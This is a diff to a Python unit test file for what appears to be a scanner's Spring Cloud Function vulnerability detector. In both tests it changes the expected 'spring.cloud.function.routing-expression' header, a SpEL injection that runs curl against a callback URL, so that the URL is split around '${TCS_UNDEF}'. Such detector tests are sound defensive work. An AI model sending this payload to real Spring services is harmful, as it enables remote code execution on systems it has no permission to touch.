@@ -78,8 +78,12 @@ class SpringCloudFunctionDetectorTest(absltest.TestCase):
         status_code=500,
         request_headers={
             'spring.cloud.function.routing-expression': (
-                'T(java.lang.Runtime).getRuntime().exec("curl %s")'
-                % _CALLBACK_URL
+                'T(java.lang.Runtime).getRuntime().exec("curl'
+                ' %s${TCS_UNDEF}%s")'
+                % (
+                    _CALLBACK_URL[0 : len(_CALLBACK_URL) // 2],
+                    _CALLBACK_URL[len(_CALLBACK_URL) // 2 :],
+                )
             )
         },
     )
@@ -136,8 +140,12 @@ class SpringCloudFunctionDetectorTest(absltest.TestCase):
         status_code=500,
         request_headers={
             'spring.cloud.function.routing-expression': (
-                'T(java.lang.Runtime).getRuntime().exec("curl %s")'
-                % _CALLBACK_URL
+                'T(java.lang.Runtime).getRuntime().exec("curl'
+                ' %s${TCS_UNDEF}%s")'
+                % (
+                    _CALLBACK_URL[0 : len(_CALLBACK_URL) // 2],
+                    _CALLBACK_URL[len(_CALLBACK_URL) // 2 :],
+                )
             )
         },
     )
